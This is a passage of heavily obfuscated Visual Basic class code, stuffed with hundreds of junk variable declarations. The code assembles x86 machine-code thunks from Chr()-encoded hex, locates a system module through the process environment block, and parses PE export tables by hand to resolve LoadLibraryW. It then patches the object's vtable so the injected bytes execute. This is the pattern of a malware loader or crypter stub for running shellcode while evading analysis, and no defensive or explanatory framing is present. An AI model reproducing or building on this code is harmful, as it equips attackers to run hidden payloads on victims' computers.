End With
Dim bckbcihafqqgjp23 As String
bckbcihafqqgjp23 = ""
Dim vhmhgdlktmrtsbi67 As String
vhmhgdlktmrtsbi67 = ""
Dim pttsvoloflk51 As String
pttsvoloflk51 = ""
Dim mspibckbci42 As String
mspibckbci42 = ""
Dim pjqstpeqhavq17 As String
pjqstpeqhavq17 = ""
Dim ondrdtvkvdbj96 As String
ondrdtvkvdbj96 = ""
Dim obevnllkngjmtii12 As String
obevnllkngjmtii12 = ""
Dim qhavqcuqaft4 As String
qhavqcuqaft4 = ""
Dim rdtvkvdbjhr31 As String
rdtvkvdbjhr31 = ""
Dim racafntabfp24 As String
racafntabfp24 = ""
Dim fnrmeccbdtq71 As String
fnrmeccbdtq71 = ""
Dim raahikgrbung51 As String
raahikgrbung51 = ""
Dim outlrggrveqcqel2 As String
outlrggrveqcqel2 = ""
lbdjobgbrhq = True
Dim pimpnsdenosg75 As String
pimpnsdenosg75 = ""
Dim uuchercjsectlop82 As String
uuchercjsectlop82 = ""
Dim nnuvatholestg50 As String
nnuvatholestg50 = ""
Dim iaicdojignm21 As String
iaicdojignm21 = ""
Dim jtrijajlpkbf45 As String
jtrijajlpkbf45 = ""
Dim ipeekgheofsr25 As String
ipeekgheofsr25 = ""
Dim qmsappjepdiognhjupo87 As String
qmsappjepdiognhjupo87 = ""
Dim eohlomrcjmmqecp39 As String
eohlomrcjmmqecp39 = ""
Dim meqbprdhcqo15 As String
meqbprdhcqo15 = ""
End Function
Public Function cognhjujolt(ByVal w87gt35g83eif As Long, ParamArray swgues()) As Long
Dim hnkdstfrtdiqarlakj66 As String
hnkdstfrtdiqarlakj66 = ""
Dim meohmonrdjm14 As String
meohmonrdjm14 = ""
Dim nplamdsqmuqmsbp16 As String
nplamdsqmuqmsbp16 = ""
Dim qpftfvalafdkj3 As String
qpftfvalafdkj3 = ""
Dim krkunsusbjpstbl37 As String
krkunsusbjpstbl37 = ""
Dim grlsturgsjcareasc15 As String
grlsturgsjcareasc15 = ""
Dim brgqpftfvala14 As String
brgqpftfvala14 = ""
Dim mkrkunsusbjps54 As String
mkrkunsusbjps54 = ""
Dim gmehpsofdedfvsvmb13 As String
gmehpsofdedfvsvmb13 = ""
Dim lPtr        As Long
Dim isdaphirhjptgmg22 As String
isdaphirhjptgmg22 = ""
Dim bqetbechovccgqofg82 As String
bqetbechovccgqofg82 = ""
Dim vsvmbrcdeblc75 As String
vsvmbrcdeblc75 = ""
Dim i           As Long
Dim pvdmsmgsffrjqkmb80 As String
pvdmsmgsffrjqkmb80 = ""
Dim inueiimaulldgo84 As String
inueiimaulldgo84 = ""
Dim jjlfcfrhbhjkhr7 As String
jjlfcfrhbhjkhr7 = ""
Dim qkmbmroavisgdb90 As String
qkmbmroavisgdb90 = ""
Dim oosgeqrjmubtki68 As String
oosgeqrjmubtki68 = ""
Dim sData       As String
Dim neusnasouc87 As String
neusnasouc87 = ""
Dim mcllbpaqshsbugfocm32 As String
mcllbpaqshsbugfocm32 = ""
Dim iikdgjqgfmijg7 As String
iikdgjqgfmijg7 = ""
Dim iaarlbkpvov28 As String
iaarlbkpvov28 = ""
Dim hemkuhsonsd3 As String
hemkuhsonsd3 = ""
Dim qoonqjmpaml27 As String
qoonqjmpaml27 = ""
Dim sswgues     As String
Dim dctgbudiaarlbk1 As String
dctgbudiaarlbk1 = ""
Dim mksqencutcjpc88 As String
mksqencutcjpc88 = ""
If w87gt35g83eif = 0 Then Exit Function
Dim auutvpsvgrrcuv98 As String
auutvpsvgrrcuv98 = ""
Dim qjhdlhdjogg83 As String
qjhdlhdjogg83 = ""
Dim adgbpttsuilofkkr91 As String
adgbpttsuilofkkr91 = ""
For i = UBound(swgues) To 0 Step -1
Dim ogckgcimffaalpuks82 As String
ogckgcimffaalpuks82 = ""
Dim bdbgiobcgkiufnv20 As String
bdbgiobcgkiufnv20 = ""
Dim hvddceorulqqbcd69 As String
hvddceorulqqbcd69 = ""
Dim ckgcimffaalpu71 As String
ckgcimffaalpu71 = ""
sswgues = sswgues & Chr(54) & Chr(56) & lilcnhopqnb(CLng(swgues(i)))
Dim rvtjqcktqmdhhgjc54 As String
rvtjqcktqmdhhgjc54 = ""
Next
Dim dgjagfmoplagdslmu56 As String
dgjagfmoplagdslmu56 = ""
Dim llbejvivjrarqnvuh98 As String
llbejvivjrarqnvuh98 = ""
Dim paiqcasjnnm67 As String
paiqcasjnnm67 = ""
Dim tvrgmjcrseqscbpvkk93 As String
tvrgmjcrseqscbpvkk93 = ""
Dim kpfofpbgbatfd58 As String
kpfofpbgbatfd58 = ""
Dim uhsutbdjstbfdp25 As String
uhsutbdjstbfdp25 = ""
lPtr = VarPtr(inject_var006(0))
Dim aeedfpsvmrrcde41 As String
aeedfpsvmrrcde41 = ""
Dim lhdjnggbbmq44 As String
lhdjnggbbmq44 = ""
Dim nmkrqencechjpcdhlj36 As String
nmkrqencechjpcdhlj36 = ""
lPtr = lPtr + (UBound(swgues) + 2) * 5
Dim iaeedfpsvmrrcdeb31 As String
iaeedfpsvmrrcdeb31 = ""
Dim iipklisjavnirnjptm4 As String
iipklisjavnirnjptm4 = ""
lPtr = w87gt35g83eif - lPtr - 5
Dim hmsksmnctsqbakthki96 As String
hmsksmnctsqbakthki96 = ""
Dim jovgpkocvmnenpt49 As String
jovgpkocvmnenpt49 = ""
Dim jhmtuhhlvnekc92 As String
jhmtuhhlvnekc92 = ""
Dim kebeqaagijgqb1 As String
kebeqaagijgqb1 = ""
Dim ouslrffrveqcpel11 As String
ouslrffrveqcpel11 = ""
Dim tuhhlvnekcfnqmd29 As String
tuhhlvnekcfnqmd29 = ""
Dim ebtkoooqjgjaggmopm43 As String
ebtkoooqjgjaggmopm43 = ""
Dim nkestgsuecral89 As String
nkestgsuecral89 = ""
sData = Chr(56) & Chr(66) & Chr(52) & Chr(67) & Chr(50) & Chr(52) & Chr(48) & Chr(56) & Chr(53) & Chr(49) & Chr(60) & Chr(77) & Chr(71) & Chr(115) & Chr(83) & Chr(83) & Chr(72) & Chr(70) & Chr(50) & Chr(53) & Chr(83) & Chr(62) & Chr(69) & Chr(56) & Chr(60) & Chr(66) & Chr(83) & Chr(75) & Chr(57) & Chr(52) & Chr(83) & Chr(75) & Chr(52) & Chr(50) & Chr(71) & Chr(62) & Chr(53) & Chr(57) & Chr(56) & Chr(57) & Chr(48) & Chr(49) & Chr(54) & Chr(54) & Chr(51) & Chr(49) & Chr(67) & Chr(48) & Chr(67) & Chr(51)
Dim cssilrhpgqc62 As String
cssilrhpgqc62 = ""
sData = Replace(sData, Chr(60) & Chr(77) & Chr(71) & Chr(115) & Chr(83) & Chr(83) & Chr(72) & Chr(70) & Chr(50) & Chr(53) & Chr(83) & Chr(62), sswgues)
Dim oltsfodfejkqdeim95 As String
oltsfodfejkqdeim95 = ""
Dim iailokbffehqt82 As String
iailokbffehqt82 = ""
Dim hoedkghdoerq34 As String
hoedkghdoerq34 = ""
sData = Replace(sData, Chr(60) & Chr(66) & Chr(83) & Chr(75) & Chr(57) & Chr(52) & Chr(83) & Chr(75) & Chr(52) & Chr(50) & Chr(71) & Chr(62), lilcnhopqnb(lPtr))
Dim ntmtnpevurdbl93 As String
ntmtnpevurdbl93 = ""
Dim goruqhllkmadgtcc74 As String
goruqhllkmadgtcc74 = ""
Dim kbapksokqvnniitbgsf57 As String
kbapksokqvnniitbgsf57 = ""
Dim dblujlkpqajkosqgn81 As String
dblujlkpqajkosqgn81 = ""
Dim boogpruqhll73 As String
boogpruqhll73 = ""
Dim jqmnkukcbpktpl31 As String
jqmnkukcbpktpl31 = ""
Dim evurdclvjmkpqakko21 As String
evurdclvjmkpqakko21 = ""
Dim stpeqhgvqd41 As String
stpeqhgvqd41 = ""
Dim igbkgchmfevpfoue91 As String
igbkgchmfevpfoue91 = ""
Dim egrgliqpclatra93 As String
egrgliqpclatra93 = ""
Call sFunction05(sData)
Dim gqoeftailhu72 As String
gqoeftailhu72 = ""
Dim rhunmhplhnskk71 As String
rhunmhplhnskk71 = ""
Dim qjqkmbmroaui75 As String
qjqkmbmroaui75 = ""
Dim inuehimaukldfo93 As String
inuehimaukldfo93 = ""
Dim rgahjkgrhunm85 As String
rgahjkgrhunm85 = ""
Dim bsmblkaoaqsgsaugeo15 As String
bsmblkaoaqsgsaugeo15 = ""
Dim nosgeqrjltbski77 As String
nosgeqrjltbski77 = ""
Dim smtuashtkdbsf73 As String
smtuashtkdbsf73 = ""
Dim cshrqgugabmbg100 As String
cshrqgugabmbg100 = ""
Dim slvotvtckqtucmj13 As String
slvotvtckqtucmj13 = ""
Dim ckojbvvuaqnqhsmtuas67 As String
ckojbvvuaqnqhsmtuas67 = ""
cognhjujolt = vmfduhdvfjc
Dim uhnhcnbamelfhshmj80 As String
uhnhcnbamelfhshmj80 = ""
Dim ipaddhrpghu98 As String
ipaddhrpghu98 = ""
Dim efegatancsdef18 As String
efegatancsdef18 = ""
End Function
Private Function lilcnhopqnb(ByVal lData As Long) As String
Dim spbajthechouicgq80 As String
spbajthechouicgq80 = ""
Dim ofdedfvbfmbbhdeblc78 As String
ofdedfvbfmbbhdeblc78 = ""
Dim ptmmgamvfldkeg47 As String
ptmmgamvfldkeg47 = ""
Dim cnspbajthechouic50 As String
cnspbajthechouic50 = ""
Dim bvTemp(3)   As Byte
Dim jlehkrhgnjkhrh18 As String
jlehkrhgnjkhrh18 = ""
Dim vdssmgsflrjqkmbs38 As String
vdssmgsflrjqkmbs38 = ""
Dim uenimaukldmornei70 As String
uenimaukldmornei70 = ""
Dim epafavtedngknlqb46 As String
epafavtedngknlqb46 = ""
Dim i           As Long
Dim jssafcpvhqc8 As String
jssafcpvhqc8 = ""
Dim tvjmpgllsturfmjcqre7 As String
tvjmpgllsturfmjcqre7 = ""
Dim pfnepafavtedng5 As String
pfnepafavtedng5 = ""
Dim ccgkivfnaifbosss17 As String
ccgkivfnaifbosss17 = ""
Dim gvfppfjoemdnv40 As String
gvfppfjoemdnv40 = ""
Dim jtmqtrahirrvjb36 As String
jtmqtrahirrvjb36 = ""
e4j8c5PCdAMaIZLPodaU bvTemp(0), lData, &H4
Dim tkqpacdvkqnhvajvb8 As String
tkqpacdvkqnhvajvb8 = ""
For i = 0 To 3
Dim mfkvvlouksjtfqfk4 As String
mfkvvlouksjtfqfk4 = ""
Dim adbgnnbbfphuesvhkg19 As String
adbgnnbbfphuesvhkg19 = ""
lilcnhopqnb = lilcnhopqnb & Right(Chr(48) & Hex(bvTemp(i)), 2)
Dim gofgmrejeukt55 As String
gofgmrejeukt55 = ""
Dim bqvbafmsvaeomcdr92 As String
bqvbafmsvaeomcdr92 = ""
Dim bbadspsjvov74 As String
bbadspsjvov74 = ""
Dim qavgijfqatm42 As String
qavgijfqatm42 = ""
Dim nkdstfrtdcqal98 As String
nkdstfrtdcqal98 = ""
Dim bbsshlqgpgqchc82 As String
bbsshlqgpgqchc82 = ""
Dim ucgeqbjrdbtkoonpjg41 As String
ucgeqbjrdbtkoonpjg41 = ""
Next
Dim fcntqjbclbdj24 As String
fcntqjbclbdj24 = ""
Dim miekphhccnr16 As String
miekphhccnr16 = ""
Dim onltrfodfdikqdeimka38 As String
onltrfodfdikqdeimka38 = ""
Dim danofoquphklkmad33 As String
danofoquphklkmad33 = ""
Dim kbaojsokqunniitbgse67 As String
kbaojsokqunniitbgse67 = ""
Dim rcbluiljoqajjnspgn91 As String
rcbluiljoqajjnspgn91 = ""
End Function
Private Sub sFunction05(ByVal sThunk As String)
Dim uadvmqqqsgjmcii24 As String
uadvmqqqsgjmcii24 = ""
Dim qhgupcuqaet16 As String
qhgupcuqaet16 = ""
Dim drcsujedaihreorpuv100 As String
drcsujedaihreorpuv100 = ""
Dim naquigttluadv2 As String
naquigttluadv2 = ""
Dim qteppartpeqhguqc51 As String
qteppartpeqhguqc51 = ""
Dim eotdrdtvjedbjhre50 As String
eotdrdtvjedbjhre50 = ""
Dim i   As Long
Dim arvjhtumuaevnrrq61 As String
arvjhtumuaevnrrq61 = ""
Dim gbcvkanmevieagkdduu28 As String
gbcvkanmevieagkdduu28 = ""
Dim pkjhonbkubve74 As String
pkjhonbkubve74 = ""
Dim bacmpsjoov88 As String
bacmpsjoov88 = ""
Dim gjqfflhifpg65 As String
gjqfflhifpg65 = ""
Dim ntbqqkfqejphoikvq85 As String
ntbqqkfqejphoikvq85 = ""
Dim sdmgkusjkbkmqlc53 As String
sdmgkusjkbkmqlc53 = ""
For i = 0 To Len(sThunk) - 1 Step 2
Dim ihjdgjqfflhif26 As String
ihjdgjqfflhif26 = ""
Dim aaqkajpvnuoqf70 As String
aaqkajpvnuoqf70 = ""
Dim ismqecpphqs74 As String
ismqecpphqs74 = ""
Dim krnolvmdcqluqms87 As String
krnolvmdcqluqms87 = ""
Dim faqgpvfteual11 As String
faqgpvfteual11 = ""
Dim busbiobsakiuvnv9 As String
busbiobsakiuvnv9 = ""
inject_var006((i / 2)) = CByte(Chr(38) & Chr(104) & Mid$(sThunk, i + 1, 2))
Dim vtttvorufrqbt81 As String
vtttvorufrqbt81 = ""
Dim niqmiotllgamvekd11 As String
niqmiotllgamvekd11 = ""
Dim spbvjshdchouhcgq90 As String
spbvjshdchouhcgq90 = ""
Next
Dim vlmegpsofd9 As String
vlmegpsofd9 = ""
Dim qqprlilcnhoprncofu29 As String
qqprlilcnhoprncofu29 = ""
Dim uvhtvfksctnc91 As String
uvhtvfksctnc91 = ""
End Sub
Private Function vmfduhdvfjc() As Long
Dim igogqjoqptf54 As String
igogqjoqptf54 = ""
e4j8c5PCdAMaIZLPodaU inject_var004, ByVal ObjPtr(Me), &H4
Dim adlpkcaavbrori57 As String
adlpkcaavbrori57 = ""
Dim ldendflpcidtisrhvh20 As String
ldendflpcidtisrhvh20 = ""
Dim jujomtmapua75 As String
jujomtmapua75 = ""
Dim rsfgkumcjmobea88 As String
rsfgkumcjmobea88 = ""
inject_var004 = inject_var004 + &H1C
Dim runknekjqstpekhapq15 As String
runknekjqstpekhapq15 = ""
Dim gveppfindmdnv49 As String
gveppfindmdnv49 = ""
Dim racbfnnabfp23 As String
racbfnnabfp23 = ""
Dim qtkppabdvkqngvaiua18 As String
qtkppabdvkqngvaiua18 = ""
Dim nmekvvkotjsjt28 As String
nmekvvkotjsjt28 = ""
e4j8c5PCdAMaIZLPodaU inject_var005, ByVal inject_var004, &H4
e4j8c5PCdAMaIZLPodaU ByVal inject_var004, VarPtr(inject_var006(0)), &H4
Dim giglttghlv63 As String
giglttghlv63 = ""
Dim eiihjdadqvvghif22 As String
eiihjdadqvvghif22 = ""
Dim bggnopmahetlmv38 As String
bggnopmahetlmv38 = ""
Dim qgofqbgbaufeohl47 As String
qgofqbgbaufeohl47 = ""
Dim vtcdkttbgdqairdbsk58 As String
vtcdkttbgdqairdbsk58 = ""
Dim uvsgnkdrsfrtdbqall75 As String
uvsgnkdrsfrtdbqall75 = ""
Dim kohhbbnramul94 As String
kohhbbnramul94 = ""
vmfduhdvfjc = fmnolvgdskl
Dim ocfdijqddhlj18 As String
ocfdijqddhlj18 = ""
Dim gqtamsscefc13 As String
gqtamsscefc13 = ""
Dim nhhtagserfnsnmjr67 As String
nhhtagserfnsnmjr67 = ""
Dim rpgmuhpmivdddfur32 As String
rpgmuhpmivdddfur32 = ""
Dim hscvphirhjpngla89 As String
hscvphirhjpngla89 = ""
Dim ctspbajchjinuuhima26 As String
ctspbajchjinuuhima26 = ""
e4j8c5PCdAMaIZLPodaU ByVal inject_var004, inject_var005, &H4
End Function
Public Function dnalhgksclg(ByVal sLib As String, ByVal sProc As String) As Long
Dim ahjkgrbung42 As String
ahjkgrbung42 = ""
dnalhgksclg = Me.vvvbknqhnmt(Me.maukldmorne(sLib), sProc)
End Function
Public Function maukldmorne(ByVal sLib As String) As Long
maukldmorne = cognhjujolt(inject_var002, StrPtr(sLib & vbNullChar))
Dim desvhkgtrrrtmpsd82 As String
desvhkgtrrrtmpsd82 = ""
Dim lgokgmrjjeuktci60 As String
lgokgmrjjeuktci60 = ""
End Function
Public Property Get sFunction09() As Boolean
sFunction09 = inject_var003
End Property
Public Sub Class_Initialize()
Dim hpjlalpnvthqfbafm60 As String
hpjlalpnvthqfbafm60 = ""
Dim hlvtjkcfnqmdb56 As String
hlvtjkcfnqmdb56 = ""
Dim kdaeqgagijgqg44 As String
kdaeqgagijgqg44 = ""
Dim qnbieumnamouclrl91 As String
qnbieumnamouclrl91 = ""
Dim hssilrgpgq3 As String
hssilrgpgq3 = ""
Dim ifnmvotvudkktu67 As String
ifnmvotvudkktu67 = ""
Dim nlbiqcliervvub28 As String
nlbiqcliervvub28 = ""
Dim dourkdendfkjc87 As String
dourkdendfkjc87 = ""
Call sFunction05(Chr(56) & Chr(66) & Chr(52) & Chr(67) & Chr(50) & Chr(52) & Chr(48) & Chr(56) & Chr(53) & Chr(54) & Chr(53) & Chr(53) & Chr(51) & Chr(49) & Chr(67) & Chr(48) & Chr(54) & Chr(52) & Chr(56) & Chr(66) & Chr(55) & Chr(48) & Chr(51) & Chr(48) & Chr(56) & Chr(66) & Chr(55) & Chr(54) & Chr(48) & Chr(67) & Chr(56) & Chr(66) & Chr(55) & Chr(54) & Chr(49) & Chr(67) & Chr(56) & Chr(66) & Chr(54) & Chr(69) & Chr(48) & Chr(56) & Chr(56) & Chr(66) & Chr(55) & Chr(69) & Chr(50) & Chr(48) & Chr(56) & Chr(66) & Chr(51) & Chr(54) & Chr(51) & Chr(56) & Chr(52) & Chr(55) & Chr(49) & Chr(56) & Chr(55) & Chr(53) & Chr(70) & Chr(51) & Chr(56) & Chr(48) & Chr(51) & Chr(70) & Chr(54) & Chr(66) & Chr(55) & Chr(52) & Chr(48) & Chr(55) & Chr(56) & Chr(48) & Chr(51) & Chr(70) & Chr(52) & Chr(66) & Chr(55) & Chr(52) & Chr(48) & Chr(50) & Chr(69) & Chr(66) & Chr(69) & Chr(55) & Chr(56) & Chr(57) & Chr(50) & Chr(57) & Chr(53) & Chr _
(68) & Chr(53) & Chr(69) & Chr(67) & Chr(51))
Dim tgthpupoltrfu12 As String
tgthpupoltrfu12 = ""
Dim kisfqsqvbhq7 As String
kisfqsqvbhq7 = ""
Dim nvbfaossrthknejjqrt57 As String
nvbfaossrthknejjqrt57 = ""
Dim onfajfbhle19 As String
onfajfbhle19 = ""
Dim qlkipoclvcaf46 As String
qlkipoclvcaf46 = ""
Dim lgubcbdnqtkpp27 As String
lgubcbdnqtkpp27 = ""
Dim rggmijgqhutlgp4 As String
rggmijgqhutlgp4 = ""
Dim pjlarqnvuirfi64 As String
pjlarqnvuirfi64 = ""
Dim mtenhlvtklcln6 As String
mtenhlvtklcln6 = ""
Dim sehdqoooqkmpamlso12 As String
sehdqoooqkmpamlso12 = ""
inject_var001 = vmfduhdvfjc
Dim ntvathtkectgcueibb34 As String
ntvathtkectgcueibb34 = ""
Dim chemluispnsdjtnr35 As String
chemluispnsdjtnr35 = ""
Dim eisqghvcknj38 As String
eisqghvcknj38 = ""
Dim tandsdfgcn20 As String
tandsdfgcn20 = ""
Dim cobbnfmgitink62 As String
cobbnfmgitink62 = ""
Dim ppthfssknvduljk18 As String
ppthfssknvduljk18 = ""
Dim ipqrocpgvtobtpvd50 As String
ipqrocpgvtobtpvd50 = ""
Dim titcvhgqdnkinufoim66 As String
titcvhgqdnkinufoim66 = ""
Dim qnbofesnasoucrrll54 As String
qnbofesnasoucrrll54 = ""
Dim ccsmclrbpaqshc70 As String
ccsmclrbpaqshc70 = ""
If Not inject_var001 = 0 Then
Dim osgerrjsubtkoooqegk65 As String
osgerrjsubtkoooqegk65 = ""
inject_var002 = vvvbknqhnmt(inject_var001, Chr(76) & Chr(111) & Chr(97) & Chr(100) & Chr(76) & Chr(105) & Chr(98) & Chr(114) & Chr(97) & Chr(114) & Chr(121) & Chr(87))
Dim bbrrhkqgofpbg45 As String
bbrrhkqgofpbg45 = ""
Dim ihemluisutcdjstb78 As String
ihemluisutcdjstb78 = ""
Dim aeedfpsvmsrcef33 As String
aeedfpsvmsrcef33 = ""
Dim mhejohgbbnq35 As String
mhejohgbbnq35 = ""
Dim onksrencedijpcdhlj28 As String
onksrencedijpcdhlj28 = ""
Dim camnfnptogkkjlvc52 As String
camnfnptogkkjlvc52 = ""
Dim iiplmitjavojrnjpum95 As String
iiplmitjavojrnjpum95 = ""
If Not inject_var002 = 0 Then
Dim hmsksmodusqcaktikjn21 As String
hmsksmodusqcaktikjn21 = ""
Dim umqqprfilch40 As String
umqqprfilch40 = ""
Dim odpgftpbtpvdssnncg16 As String
odpgftpbtpvdssnncg16 = ""
Dim jdujtciaicdoji47 As String
jdujtciaicdoji47 = ""
Dim ebvelsfaeolcdqdfj22 As String
ebvelsfaeolcdqdfj22 = ""
inject_var003 = True
End If
End If
End Sub
Public Function vvvbknqhnmt(ByVal lMod As Long, ByVal sProc As String) As Long
Dim juufabuivml85 As String
juufabuivml85 = ""
Dim mkbhpckhdquuu61 As String
mkbhpckhdquuu61 = ""
Dim dnuqkcdmcekib7 As String
dnuqkcdmcekib7 = ""
Dim bnvnbinihfnlvotvtc24 As String
bnvnbinihfnlvotvtc24 = ""
Dim vvuaqnqhmmtuashnk19 As String
vvuaqnqhmmtuashnk19 = ""
Dim qgogqbmcgeleohm40 As String
qgogqbmcgeleohm40 = ""
Dim tIMAGE_DOS_HEADER       As sType005
Dim qdeisjahubjniatut82 As String
qdeisjahubjniatut82 = ""
Dim tIMAGE_NT_HEADERS       As sType009
Dim cmtqjbclbdjn76 As String
cmtqjbclbdjn76 = ""
Dim tIMAGE_EXPORT_DIRECTORY As sType010
Dim ohnccnramulahshmk78 As String
ohnccnramulahshmk78 = ""
Dim ovajjnbpgmehps54 As String
ovajjnbpgmehps54 = ""
Dim antfoaupgkl95 As String
antfoaupgkl95 = ""
Dim haopcoqaunthht39 As String
haopcoqaunthht39 = ""
Dim kntjrisejedaihqkorp11 As String
kntjrisejedaihqkorp11 = ""
Dim cjfvnobnpvdmsmgs70 As String
cjfvnobnpvdmsmgs70 = ""
Dim jmshqhrdodifngpinp53 As String
jmshqhrdodifngpinp53 = ""
Dim cqtfierppprkhkbngn90 As String
cqtfierppprkhkbngn90 = ""
Call e4j8c5PCdAMaIZLPodaU(tIMAGE_DOS_HEADER, ByVal lMod, sConst003)
Dim lftuhtvejsbsmcll29 As String
lftuhtvejsbsmcll29 = ""
Dim nltmvotvudkqtu70 As String
nltmvotvudkqtu70 = ""
Dim iaclojbvvu45 As String
iaclojbvvu45 = ""
Dim dourkdemcekpc90 As String
dourkdemcekpc90 = ""
Dim thodptrcrfud84 As String
thodptrcrfud84 = ""
Dim lpdrhogiquphff47 As String
lpdrhogiquphff47 = ""
Dim ehuddklnjuebq40 As String
ehuddklnjuebq40 = ""
Dim indldnujudbi4 As String
indldnujudbi4 = ""
Dim islpsqvghqrvjb55 As String
islpsqvghqrvjb55 = ""
Dim hgicvcpvufhie41 As String
hgicvcpvufhie41 = ""
Dim ukmsrkpeeqtcobo22 As String
ukmsrkpeeqtcobo22 = ""
Dim lqcclmqesiphjrvq30 As String
lqcclmqesiphjrvq30 = ""
If Not tIMAGE_DOS_HEADER.e_magic = sConst001 Then
Dim iveelmokvfcr12 As String
iveelmokvfcr12 = ""
Dim kvdiuhuipequse36 As String
kvdiuhuipequse36 = ""
Dim gfdkjtmqtrahirs33 As String
gfdkjtmqtrahirs33 = ""
Dim oaigbpttsuol11 As String
oaigbpttsuol11 = ""
Dim eblspiabkac69 As String
eblspiabkac69 = ""
Exit Function
Dim mggsafrdqfmrmlj4 As String
mggsafrdqfmrmlj4 = ""
Dim viimrofltgomhvcd11 As String
viimrofltgomhvcd11 = ""
Dim pprfhlbhhnpqnbieu44 As String
pprfhlbhhnpqnbieu44 = ""
Dim vdssmmcflbjaksbs32 As String
vdssmmcflbjaksbs32 = ""
Dim cvhgpdnqotu29 As String
cvhgpdnqotu29 = ""
End If
Dim vvbknqhnmtvashnkest29 As String
vvbknqhnmtvashnkest29 = ""
Dim ugfohmpnsd100 As String
ugfohmpnsd100 = ""
Dim quutapmpgml24 As String
quutapmpgml24 = ""
Call e4j8c5PCdAMaIZLPodaU(tIMAGE_NT_HEADERS, ByVal lMod + tIMAGE_DOS_HEADER.e_lfanew, sConst004)
Dim bmqvlulvhs29 As String
bmqvlulvhs29 = ""
Dim dhrjvguaimh73 As String
dhrjvguaimh73 = ""
Dim edfvsvmrrcd99 As String
edfvsvmrrcd99 = ""
Dim dgtdcjlmit56 As String
dgtdcjlmit56 = ""
Dim kbbpktplrvooiiubhtf48 As String
kbbpktplrvooiiubhtf48 = ""
If Not tIMAGE_NT_HEADERS.Signature = sConst002 Then
Dim kfebjireprqvagpquca71 As String
kfebjireprqvagpquca71 = ""
Exit Function
Dim mubeanrrqtgjmdjiprs77 As String
mubeanrrqtgjmdjiprs77 = ""
Dim hmfaieagldduujnsi63 As String
hmfaieagldduujnsi63 = ""
End If
Dim hpnbkvbaegmvae3 As String
hpnbkvbaegmvae3 = ""
Dim fpndesehkg25 As String
fpndesehkg25 = ""
Dim qrjltbskiih3 As String
qrjltbskiih3 = ""
Dim ntbqqlfqejphpjlvqp50 As String
ntbqqlfqejphpjlvqp50 = ""
Dim rcjsnrfcpqhqsar6 As String
rcjsnrfcpqhqsar6 = ""
Dim lVAddress   As Long
Dim nolamdcqluqmsappkk1 As String
nolamdcqluqmsappkk1 = ""
Dim argqvfteualg58 As String
argqvfteualg58 = ""
Dim usbipcsaki44 As String
usbipcsaki44 = ""
Dim fvbelbahdeb39 As String
fvbelbahdeb39 = ""
Dim lVSize      As Long
Dim njptmmgamvfldkegr43 As String
njptmmgamvfldkegr43 = ""
Dim chouicgqoff86 As String
chouicgqoff86 = ""
Dim jjlehkrhgnjkgr10 As String
jjlehkrhgnjkgr10 = ""
Dim jqkmbsroavisgihmn25 As String
jqkmbsroavisgihmn25 = ""
Dim lBase       As Long
Dim cvtcjqdtbljabobd78 As String
cvtcjqdtbljabobd78 = ""
Dim jauvuaqtahsscuvs71 As String
jauvuaqtahsscuvs71 = ""
Dim kohhbshraguf52 As String
kohhbshraguf52 = ""
Dim htlsmodotqcbk10 As String
htlsmodotqcbk10 = ""
Dim cmfjmkpagkkoca67 As String
cmfjmkpagkkoca67 = ""
Dim htesvhkgtrrrtmjmd80 As String
htesvhkgtrrrtmjmd80 = ""
Dim hvajvbgluduoennd18 As String
hvajvbgluduoennd18 = ""
Dim ouksjtfqfkhpirk77 As String
ouksjtfqfkhpirk77 = ""
Dim ndkcenqmdbbadspsjuo42 As String
ndkcenqmdbbadspsjuo42 = ""
With tIMAGE_NT_HEADERS.OptionalHeader
Dim vgijfqatmf71 As String
vgijfqatmf71 = ""
lVAddress = lMod + .DataDirectory(0).VirtualAddress
Dim laejvivjrfrvtft21 As String
laejvivjrfrvtft21 = ""
Dim monrddmnrftjq100 As String
monrddmnrftjq100 = ""
Dim dbskoonpjgjaffmnpl54 As String
dbskoonpjgjaffmnpl54 = ""
Dim rrgkpfnfpala13 As String
rrgkpfnfpala13 = ""
Dim hgelkunsusbijst6 As String
hgelkunsusbijst6 = ""
Dim edfvsvmrrcd8 As String
edfvsvmrrcd8 = ""
lVSize = lVAddress + .DataDirectory(0).Size
Dim phirhjpngm30 As String
phirhjpngm30 = ""
Dim tnndgmckbltctspbak34 As String
tnndgmckbltctspbak34 = ""
Dim gpptbvmsenvsofjjjlf89 As String
gpptbvmsenvsofjjjlf89 = ""
Dim iioqrocjfvn44 As String
iioqrocjfvn44 = ""
Dim qaettoodhmckcmtctsq8 As String
qaettoodhmckcmtctsq8 = ""
Dim eotdrdtujedbihre51 As String
eotdrdtujedbihre51 = ""
lBase = .ImageBase
End With
Call e4j8c5PCdAMaIZLPodaU(tIMAGE_EXPORT_DIRECTORY, ByVal lVAddress, sConst005)
Dim joovabuipmftuhtvfd46 As String
joovabuipmftuhtvfd46 = ""
Dim nmevieagkd48 As String
nmevieagkd48 = ""
Dim vqpmuthqehfkls20 As String
vqpmuthqehfkls20 = ""
Dim bkmplcgggisvco75 As String
bkmplcgggisvco75 = ""
Dim fokgmqjjddptco13 As String
fokgmqjjddptco13 = ""
Dim qrbllptrioajrok5 As String
qrbllptrioajrok5 = ""
Dim mocehuedkmnjueb51 As String
mocehuedkmnjueb51 = ""
Dim bgvuppfiodmdnvevur70 As String
bgvuppfiodmdnvevur70 = ""
Dim ualgfckjsfqs74 As String
ualgfckjsfqs74 = ""
Dim hmjrqdmbtsbiobsaki54 As String
hmjrqdmbtsbiobsaki54 = ""
Dim i           As Long
Dim nfddcfubelaahdealb88 As String
nfddcfubelaahdealb88 = ""
Dim iotllgamvekdkeg58 As String
iotllgamvekdkeg58 = ""
Dim lFunctAdd   As Long
Dim lNameAdd    As Long
Dim pcnjimuenima31 As String
pcnjimuenima31 = ""
Dim jikehkrggnikgr20 As String
jikehkrggnikgr20 = ""
Dim bsmblqaoaq17 As String
bsmblqaoaq17 = ""
Dim vispnsektosgdqr77 As String
vispnsektosgdqr77 = ""
Dim rppoqknqbmm10 As String
rppoqknqbmm10 = ""
Dim itjapojrnjpummh7 As String
itjapojrnjpummh7 = ""
Dim qcstiucaigq60 As String
qcstiucaigq60 = ""
Dim lNumbAdd    As Long
Dim pquigstlnvdumkk10 As String
pquigstlnvdumkk10 = ""
Dim oipqsodpgvt70 As String
oipqsodpgvt70 = ""
Dim patmefoegmqd44 As String
patmefoegmqd44 = ""
Dim ntrkqffqudpbpdk31 As String
ntrkqffqudpbpdk31 = ""
Dim ufeohlomrc19 As String
ufeohlomrc19 = ""
Dim ttbgdqairdbskn24 As String
ttbgdqairdbskn24 = ""
Dim gnkdrsfrtdbqaklaej74 As String
